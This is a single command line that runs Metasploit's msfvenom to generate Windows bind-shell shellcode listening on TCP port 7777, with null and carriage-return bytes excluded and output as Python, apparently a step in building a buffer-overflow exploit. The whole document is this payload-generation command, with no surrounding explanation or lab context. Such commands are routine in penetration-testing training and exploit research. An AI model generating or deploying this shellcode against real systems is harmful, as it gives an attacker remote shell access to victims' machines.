/usr/share/metasploit-framework/msfvenom -p windows/shell_bind_tcp LPORT=7777 -b '\x00\x0d' -f python
